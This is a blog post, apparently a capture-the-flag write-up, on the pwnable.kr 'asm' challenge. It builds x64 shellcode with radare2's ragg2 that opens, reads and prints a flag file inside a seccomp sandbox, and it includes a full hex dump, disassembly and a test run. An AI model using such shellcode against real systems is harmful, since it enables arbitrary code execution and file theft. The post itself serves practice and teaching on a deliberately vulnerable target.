---
layout: post
title: r2land - asm challenge
tags: [ shellcode, radare2 ]
---

This challenge is hosted at ``pwnable.kr`` and is about to teach the basics of shellcoding.
We will use ``radare2`` framework for analysis and exploit development. Because I am lazy and I won't give you a flag from this chall here, I've downloaded the ``asm`` file and 'exploited' it locally. 

## The challenge

After we get logged into the remote-end, we can see this:

```
asm@ubuntu:~$ ls -la
total 48
drwxr-x---  5 root asm   4096 Jan  2  2017 .
drwxr-xr-x 92 root root  4096 Aug 12 10:28 ..
d---------  2 root root  4096 Nov 19  2016 .bash_history
dr-xr-xr-x  2 root root  4096 Nov 25  2016 .irssi
drwxr-xr-x  2 root root  4096 Jan  2  2017 .pwntools-cache
-rwxr-xr-x  1 root root 13704 Nov 29  2016 asm
-rw-r--r--  1 root root  1793 Nov 29  2016 asm.c
-rw-r--r--  1 root root   211 Nov 19  2016 readme
-rw-r--r--  1 root root    67 Nov 19  2016 this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
asm@ubuntu:~$ cat readme 
once you connect to port 9026, the "asm" binary will be executed under asm_pwn privilege.
make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)
asm@ubuntu:~$ file ./asm
./asm: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d7401f94b1d6bf6a5afe4b8a9457e71faa2eb5e9, not stripped
asm@ubuntu:~$ 
```

So it looks like, the code of ``asm`` binary is a first place to look at.

### The host process code

{% highlight C %}
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
	seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Welcome to shellcoding practice challenge.\n");
	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
	printf("If this does not challenge you. you should play 'asg' challenge :)\n");

	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
	sandbox();
	((void (*)(void))sh)();
	return 0;
}

{% endhighlight %}

The code is self descriptive and has following properties:

- is x86 64 bit ELF
- has seccomp filtering applied which means your shellcode can execute only whitelisted syscalls.
- there is some ``stub`` code which is executed before user-supplied shellcode.


## The Plan

The ``asm`` image host process is spawned locally via ``nc`` on port 9026. We will construct a shellcode that dumps the content of a file, which is supposed to hold the flag.
As promised, we will use radare2 framework to achieve this.

### Stub assembly

I've downloaded ``asm`` ELF file from remote end and started analysis:

```
$ radare2 -AA ./asm
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[x] Emulate code to find computed references (aae)
[x] Analyze consecutive function (aat)
 -- Get a free shell with 'ragg2 -i exec -x'
[0x00000b20]> 
```
The ``-AA`` switch is about to analyze the binary file. This is the opposite behaviour from the one observed in the IDA for example, where the analysis starts automatically.

I want to get to know what the stub does, we can list (and grep) symbols with the ``is~stub`` command
(info symbol grep stub)
```
[0x00000b20]> is~stub
066 0x000020c0 0x002020c0 GLOBAL    OBJ   46 stub
[0x00000b20]>
```
stub is a globally accessed symbol of size 46. 
You can view disassembly by seeking (s) to that address, changing the block size to 46 (b 46), and printing the disassembly (pd).

```
[0x00000b20]> s 0x002020c0
[0x002020c0]> b
0x100
[0x002020c0]> b 46
[0x002020c0]> pd
            ;-- stub:
            ; DATA XREFS from sym.main (0xe24, 0xe3a)
            0x002020c0      4831c0         xor rax, rax
            0x002020c3      4831db         xor rbx, rbx
            0x002020c6      4831c9         xor rcx, rcx
            0x002020c9      4831d2         xor rdx, rdx
            0x002020cc      4831f6         xor rsi, rsi
            0x002020cf      4831ff         xor rdi, rdi
            0x002020d2      4831ed         xor rbp, rbp
            0x002020d5      4d31c0         xor r8, r8
            0x002020d8      4d31c9         xor r9, r9
            0x002020db      4d31d2         xor r10, r10
            0x002020de      4d31db         xor r11, r11
[0x002020c0]> 
```

So the purpose of the ``stub`` assembly is to clear the registers. Let's summarize the knowledge:
 - the process with ``asm`` ELF image is spawned locally via ``nc``
 - we are able to execute arbitrary code in the abovementioned process under the sandbox tightenings
 - the file ``this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo00000
00000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong`` contains a flag and is accessible by ``asm`` process.

## ragg2 problems

We will use ``ragg2`` to generate the shellcode. It should be as simple as this:

{% highlight C %}
const char* file="this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong";
int main()
{
	char buff[4096];
	int fd = open(file,0,0);
	int len = read(fd, buff, 4096);
	write(1,buff,len);
}
{% endhighlight %}


To generate shellcode in this particular scenario (same arch and bits of host and target), simply execute following command:

```
$ ragg2 shellcode.c
```

But unfortunately, it does not compile.

```
$ ragg2 shellcode.c
'clang' -fPIC -fPIE -pie -fpic -m64 -fno-stack-protector -nostdinc -include '/usr/include/libr/sflib'/'linux-x86-64'/sflib.h -z execstack -fomit-frame-pointer -finline-functions -fno-zero-initialized-in-bss -o 'shellcode.c.tmp' -S -Os 'shellcode.c'
clang: warning: -z execstack: 'linker' input unused [-Wunused-command-line-argument]
clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]
'clang' -fPIC -fPIE -pie -fpic -m64 -nostdlib -Os -o 'shellcode.c.o' 'shellcode.c.s'
rabin2 -o 'shellcode.c.text' -O d/S/'.text' 'shellcode.c.o'
!!! Oops
fail assembling
r_egg_assemble: invalid assembly
$ 
```

Well. Bad start, isn't it? It occurs that r2 2.9 has some bug. It looks like this particular example does not compile to relocable shellcode if the ``file`` C-string has more than 48 characters.
Consider following proof:

```
$ cat shellcode.c 

//const char* file="this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong";

const char* file="shellcode.c";
int main()
{
	char buff[4096];
	int fd = open(file,0,0);
	int len = read(fd, buff, 4096);
	write(1,buff,len);
}
$ ragg2 shellcode.c -z
'clang' -fPIC -fPIE -pie -fpic -m64 -fno-stack-protector -nostdinc -include '/usr/include/libr/sflib'/'linux-x86-64'/sflib.h -z execstack -fomit-frame-pointer -finline-functions -fno-zero-initialized-in-bss -o 'shellcode.c.tmp' -S -Os 'shellcode.c'
clang: warning: -z execstack: 'linker' input unused [-Wunused-command-line-argument]
clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]
'clang' -fPIC -fPIE -pie -fpic -m64 -nostdlib -Os -o 'shellcode.c.o' 'shellcode.c.s'
rabin2 -o 'shellcode.c.text' -O d/S/'.text' 'shellcode.c.o'
"\xeb\x00\x48\x81\xec\x88\x0f\x00\x00\x48\x8d\x05\xe8\x0d\x20\x00\x48\x8b\x38\x31\xf6\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc1\x48\x8d\x74\x24\x80\xba\x00\x10\x00\x00\x31\xc0\x89\xcf\x0f\x05\x48\x89\xc1\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x89\xca\x0f\x05\x31\xc0\x48\x81\xc4\x88\x0f\x00\x00\xc3\x73\x68\x65\x6c\x6c\x63\x6f\x64\x65\x2e\x63\x00"
$ 
```

As it seemed to be a bug, I've submitted the issue to radare team: https://github.com/radare/radare2/issues/11104

Back to the task, unfortunately it sounds like another bug. Our shellcode, generated by ``ragg2`` does not work either.  Let's see why.

```
$ r2 ./shellcode.rr2 
 -- Nothing to see here. Move along.
[0x00000000]> b 0x80;pd
        ,=< 0x00000000      eb00           jmp 2
        `-> 0x00000002      4881ec880f00.  sub rsp, 0xf88
            0x00000009      488d05e80d20.  lea rax, [0x00200df8]
            0x00000010      488b38         mov rdi, qword [rax]
            0x00000013      31f6           xor esi, esi
            0x00000015      31d2           xor edx, edx
            0x00000017      b802000000     mov eax, 2
            0x0000001c      0f05           syscall
            0x0000001e      4889c1         mov rcx, rax
            0x00000021      488d742480     lea rsi, [rsp - 0x80]
            0x00000026      ba00100000     mov edx, 0x1000
            0x0000002b      31c0           xor eax, eax
            0x0000002d      89cf           mov edi, ecx
            0x0000002f      0f05           syscall
            0x00000031      4889c1         mov rcx, rax
            0x00000034      bf01000000     mov edi, 1
            0x00000039      b801000000     mov eax, 1
            0x0000003e      89ca           mov edx, ecx
            0x00000040      0f05           syscall
            0x00000042      31c0           xor eax, eax
            0x00000044      4881c4880f00.  add rsp, 0xf88
            0x0000004b      c3             ret
            0x0000004c      666c           insb byte [rdi], dx
            0x0000004e      61             invalid
        ,=< 0x0000004f      672e7478       je 0xcb
       ,==< 0x00000053      7400           je 0x55
       `--> 0x00000055      0aff           or bh, bh
        |   0x00000057      ff             invalid
        |   0x00000058      ff             invalid
```

It looks like ``ragg2`` fails to calculate relative offsets. Following instruction ``0x00000009      488d05e80d20.  lea rax, [0x00200df8]`` moves value 0x00200df8 to rax register. It should point to the 'flag.txt' string, which is located at 0x04c offset.

Let me rewrite our shellcode to simpler form, with thiner stack based buffer, say hardcoded 32 bytes (read,write). Maybe this time ``ragg2`` will succeed.

```
$ cat open.c
int main() {
	char buf[32];
	read(open("flag.txt", 0, 0), buf, 32);
	write(1,buf,32);
}
$ ragg2 open.c -x
'clang' -fPIC -fPIE -pie -fpic -m64 -fno-stack-protector -nostdinc -include '/usr/include/libr/sflib'/'linux-x86-64'/sflib.h -z execstack -fomit-frame-pointer -finline-functions -fno-zero-initialized-in-bss -o 'open.c.tmp' -S -Os 'open.c'
clang: warning: -z execstack: 'linker' input unused [-Wunused-command-line-argument]
clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]
'clang' -fPIC -fPIE -pie -fpic -m64 -nostdlib -Os -o 'open.c.o' 'open.c.s'
rabin2 -o 'open.c.text' -O d/S/'.text' 'open.c.o'
CTF{TEST}
t�U��$ 
$
```

Yes, this time it works. ``-x`` switch executes produced shellcode so you can validate it on the fly. 
If we look at the content of generated assemmbly it reminds previous code. C-string is hardcoded in .text section and it's address is relatively calculated via ``lea`` instruction. Having this, we can patch binary with C-string of our choice and such modified binary should open the file with long name.

## Final shellcode

```
$ xxd shellcode
00000000: eb00 488d 3d32 0000 0031 f631 d2b8 0200  ..H.=2...1.1....
00000010: 0000 0f05 4889 c148 8d74 24d8 ba20 0000  ....H..H.t$.. ..
00000020: 0031 c089 cf0f 05bf 0100 0000 ba20 0000  .1........... ..
00000030: 00b8 0100 0000 0f05 31c0 c374 6869 735f  ........1..this_
00000040: 6973 5f70 776e 6162 6c65 2e6b 725f 666c  is_pwnable.kr_fl
00000050: 6167 5f66 696c 655f 706c 6561 7365 5f72  ag_file_please_r
00000060: 6561 645f 7468 6973 5f66 696c 652e 736f  ead_this_file.so
00000070: 7272 795f 7468 655f 6669 6c65 5f6e 616d  rry_the_file_nam
00000080: 655f 6973 5f76 6572 795f 6c6f 6f6f 6f6f  e_is_very_looooo
00000090: 6f6f 6f6f 6f6f 6f6f 6f6f 6f6f 6f6f 6f6f  oooooooooooooooo
000000a0: 6f6f 6f6f 6f6f 6f6f 6f6f 6f6f 6f6f 6f6f  oooooooooooooooo
000000b0: 6f6f 6f6f 6f6f 6f6f 6f6f 6f6f 6f6f 6f6f  oooooooooooooooo
000000c0: 6f6f 6f6f 6f6f 6f6f 6f6f 6f6f 6f6f 6f6f  oooooooooooooooo
000000d0: 6f6f 6f6f 6f6f 6f30 3030 3030 3030 3030  ooooooo000000000
000000e0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
000000f0: 6f6f 6f6f 6f6f 6f6f 6f6f 6f6f 6f6f 6f6f  oooooooooooooooo
00000100: 6f6f 6f6f 6f6f 6f30 3030 3030 3030 3030  ooooooo000000000
00000110: 3030 306f 306f 306f 306f 306f 306f 306f  000o0o0o0o0o0o0o
00000120: 6e67 00                                  ng.
$ 
```
radare2 (partial disassembly):

```
$ r2 ./shellcode
 -- You see it, you fix it!
[0x00000000]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x00000000]> pd
/ (fcn) fcn.00000000 59
|   fcn.00000000 ();
|       ,=< 0x00000000      eb00           jmp 2
|       `-> 0x00000002      488d3d320000.  lea rdi, [0x0000003b]       ; "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_looooooooooooooooooooooooooooooooooooooooooooooo" ; ';' ; 59
|           0x00000009      31f6           xor esi, esi
|           0x0000000b      31d2           xor edx, edx
|           0x0000000d      b802000000     mov eax, 2
|           0x00000012      0f05           syscall
|           0x00000014      4889c1         mov rcx, rax
|           0x00000017      488d7424d8     lea rsi, [rsp - 0x28]
|           0x0000001c      ba20000000     mov edx, 0x20               ; 32
|           0x00000021      31c0           xor eax, eax
|           0x00000023      89cf           mov edi, ecx
|           0x00000025      0f05           syscall
|           0x00000027      bf01000000     mov edi, 1
|           0x0000002c      ba20000000     mov edx, 0x20               ; 32
|           0x00000031      b801000000     mov eax, 1
|           0x00000036      0f05           syscall
|           0x00000038      31c0           xor eax, eax
\           0x0000003a      c3             ret
            ; DATA XREF from fcn.00000000 (0x2)
        ,=< 0x0000003b      7468           je 0xa5
        |   0x0000003d      69735f69735f.  imul esi, dword [rbx + 0x5f], 0x705f7369

```

Redirect shellcode to asm's stdin

```
$ ./asm < shellcode
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
give me your x64 shellcode: CTF{TEST2}
�>V`���>VSegmentation fault (core dumped)
$ 
```

## Conclusion

We have seen how powerfull r2land might be, however it was shown that ``ragg2`` struggles with some teething problems.
Despite the problem with offset calculation, ``ragg2`` is promising tool. I have to admit that I had a different approach with shellcoding such cases.
I was using the stack heavily (e.g. pushing whole string to the stack preserving endianess is a pain in the ass). Having C-string in .text area is more readable, isn't it?

